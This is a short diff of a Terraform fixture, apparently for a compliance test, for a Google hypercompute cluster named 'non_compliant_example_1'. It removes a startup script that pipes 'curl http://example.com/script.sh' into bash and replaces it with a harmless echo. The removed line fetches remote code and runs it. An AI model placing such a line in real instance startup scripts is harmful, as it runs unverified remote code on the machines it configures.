@@ -38,7 +38,7 @@ resource "google_hypercomputecluster_cluster" "non_compliant_example_1" {
         static_node_count = 1
 
         compute_instance {
-          startup_script = "#!/bin/bash\ncurl http://example.com/script.sh | bash"
+          startup_script = "#!/bin/bash\necho configured-startup-script"
         }
       }
 
